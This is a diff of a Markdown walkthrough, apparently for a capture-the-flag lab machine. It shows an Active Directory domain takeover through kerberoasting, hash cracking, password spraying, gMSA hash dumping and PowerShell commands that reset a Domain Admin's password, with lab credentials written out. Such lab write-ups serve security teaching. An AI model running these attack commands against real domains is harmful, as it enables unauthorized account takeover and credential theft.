@@ -8,8 +8,7 @@
 7. One of the passwords worked for a certain user called `sierra.frye` which had the permission to read the GMSA password of `BIR-ADFS-GMSA$`.
 8. That account has a `WriteDACL` right on a Domain Administrator called `tristan.davies`.
 9. We use a python script to retrieve the NTLM hash of `BIR-ADFS-GMSA$` and abuse his rights to reset the password of `tristan.davies` via RPC.
-10. When trying to get a shell on the box, Antivirus stops us. So we get around that by enabling PowerShell Remoting then using `evil-winrm`.
-11. Another route that is a bit longer includes using the PowerShell Web Access enabled on the web server after cracking then importing a `.pfx` certificate into our browser. One we found on the shared user profile of the `sierra.frya` user.
+10. Another route that is a bit longer includes using the PowerShell Web Access enabled on the web server after cracking then importing a `.pfx` certificate into our browser. One we found on the shared user profile of the `sierra.frya` user.
 
 ---
 
@@ -115,5 +114,163 @@ Earlier, when extracted user names from the website:
 
 ![website-users](website-users.jpg)
 
-we used a python tool called `ADGenerator` [here](https://github.com/w0Tx/generate-ad-username) to generate a list of username based on their first and last names following common naming conventions.
+we used a python tool called `ADGenerator` [here](https://github.com/w0Tx/generate-ad-username) to generate a list of username based on their first and last names following common naming conventions:
 
+- NameSurname
+- Name.Surname
+- NamSur (3letters of each)
+- Nam.Sur
+- NSurname
+- N.Surname
+- SurnameName
+- Surname.Name
+- SurnameN
+- Surname.N
+
+and we used a tool called `kerbrute` [here](https://github.com/ropnop/kerbrute) to enumerate which were valid users names using the `userenum` module.
+
+![kerbrute-userenum](kerbrute-userenum.jpg)
+
+So we know that the username convention is Name.Surname
+
+We went ahead and found the password "IsolationIsKey?" to work just fine with "Hope.Sharp"
+
+![auth-as-hope-sharp](auth-as-hope-sharp.jpg)
+
+### The Awesomeness of BloodHound
+Since port 5985 isn't open, we have no reason to check for WinRM capabilities. So we turn to using all the tools that don't require foothold on the box.
+
+We start with `BloodHound.py` [here](https://github.com/fox-it/BloodHound.py) to get an overview of the situation in the domain.
+
+Note: recommended to set your DNS server in `/etc/resolv.conf` to the box's IP to make sure things go smooth when using any of the tools we're about to use.
+
+Command: `python3 bloodhound.py -d search.htb -dc research.search.htb -u hope.sharp -p 'IsolationIsKey?'`
+
+![bloodhound-py](bloodhound-py.jpg)
+
+When checking the output of the `ShortestPath to High Value Targets`, we see a clear path to owning the domain:
+
+![clear-path-to-DA](clear-path-to-DA.jpg)
+
+We would first have to make our way to any of users on the left within the `ITSEC` group though. So we move on..
+
+In another `BloodHound` query for kerberoastable accounts, we find we can attack `WEB_SVC`:
+
+![web-svc-kerberoastable](web-svc-kerberoastable.jpg)
+
+Command: `python3 GetUserSPNs.py -debug -request -dc-ip 10.10.11.129 search.htb/hope.sharp:'IsolationIsKey?'`
+
+![kerberoasted](kerberoasted.jpg)
+
+And we crack the password using `john`
+
+Command: `john web_svc_hash -w=/usr/share/wordlists/rockyou.txt`
+
+![cracked-with-john](cracked-with-john.jpg)
+
+The password was "@3ONEmillionbaby"
+
+### Checking for Password Reuse
+It has turned into a habit for me to spray any password I get on all possible users xD
+
+I use `crackmapexec` with the `--users` flag to obtain to full list of users on the domain.
+
+Command: `crackmapexec smb 10.10.11.129 -u 'web_svc' -p '@3ONEmillionbaby' --users`
+
+![cme-full-userlist](cme-full-userlist.jpg)
+
+Piping the output to a round of `awk` and `sed` formats the output into a nice list.
+
+We find out that another user had been user the same password "@3ONEmillionbaby"
+
+![edgar-reusing](edgar-reusing.jpg)
+
+### Enumerating SMB access for Edgar
+We use `crackmapexec`'s `spider_plus` module to get a nicely-formatted JSON output for `edgar`'s share access.
+
+Command: `crackmapexec smb 10.10.11.129 -u 'Edgar.Jacobs' -p '@3ONEmillionbaby' -M spider_plus`
+
+We notice something interesting in the results:
+
+![interesting-document-found](interesting-document-found.jpg)
+
+we use `smbclient` to fetch the file:
+
+![getting-the-sheet](getting-the-sheet.jpg)
+
+When looking into the second tab of the workbook, we notice a hidden column: C
+
+![hidden-column](hidden-column.jpg)
+
+We won't be able to unhide this column unless we unprotect the sheet:
+
+![unprotecting-sheet](unprotecting-sheet.jpg)
+
+We can however, use a trick of uploading the `xlsx` file to Google Sheets :D
+
+![got-them-passwords](got-them-passwords.jpg)
+
+PROFIT! :D
+
+### Access as Sierra
+When using the obtained passwords throughout the domain, we gain access to `seirra.frye`
+
+![got-sierra](got-sierra.jpg)
+
+and since `sierra` is member of the `ITSEC` group, we're going for a domain takeover.
+
+![path-to-da](path-to-da.jpg)
+
+### Reading the GMSA password & Resetting `tristan`'s password
+We can obtain the NTLM hash of the GMSA `BIR-ADFS-GMSA$` with a python tool called `gMSADumper` [here](https://github.com/micahvandeusen/gMSADumper)
+
+Command: `python3 gMSADumper/gMSADumper.py -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -d search.htb`
+
+![got-gmsa-ntlm](got-gmsa-ntlm.jpg)
+
+What's left is to reset the password for `tristan` which we can do through `rpcclient` using the `--pw-nt-hash` to pass the hash.
+
+we can then use the `setuserinfo2` command to set the new password and we get full shell access using impacket's `wmiexec.py`
+
+![got-tristan](got-tristan.jpg)
+
+### Alternate Route: cracking the `.pfx` certificate on `sierra`'s share + using it for PowerShell web access
+If we take sometime to check `sierra` profile, we see a file called `staff.pfx` in the `Downloads/Backups` folder:
+
+![pfx-found](pfx-found.jpg)
+
+Using `john`'s python script `pfx2john`, we get a format that's crackable.
+
+![cracked-pfx](cracked-pfx.jpg)
+
+We can import this certificate into `firefox`
+
+![firefox-cert-import](firefox-cert-import.jpg)
+
+After importing the certificate, we can browse to `https://10.10.11.129/staff`
+
+![powershell-web-access](powershell-web-access.jpg)
+
+we a nice web terminal after authenticating:
+
+![powershell-web-terminal](powershell-web-terminal.jpg)
+
+In order to be able to run code as `BIR-ADFS-GMSA`, we're going to do a couple of things:
+
+1. Obtain the GMSA password as a secure string. This can be done through the below command:
+`$secstringpassword = (ConvertFrom-ADManagedPasswordBlob (get-adserviceaccount -filter * -Properties msDS-ManagedPassword).'msDS-ManagedPassword').SecureCurrentPassword`
+
+2. Create a `PSCredential` object with both the GMSA username and the secure string.
+`$cred = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $secstringpassword`
+
+3. Executing a password reset command using the created `PSCredential`:
+`$Script = {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'H@CKEDAGA1N!!' -force)}`
+`Invoke-Command -ComputerName 127.0.0.1 -credential $cred -ScriptBlock $Script`
+
+4. Creating another `PSCredential` object but with `tristan`'s new password:
+`$killercreds = New-Object System.Management.Automation.PSCredential Tristan.Davies, (ConvertTo-SecureString -AsPlainText 'H@CKEDAGA1N!!' -force)`
+
+5. Executing commands using those credentials:
+`Invoke-Command -ComputerName 127.0.0.1 -credential $killercreds -ScriptBlock {whoami}`
+
+![tristan-web-access](tristan-web-access.jpg)
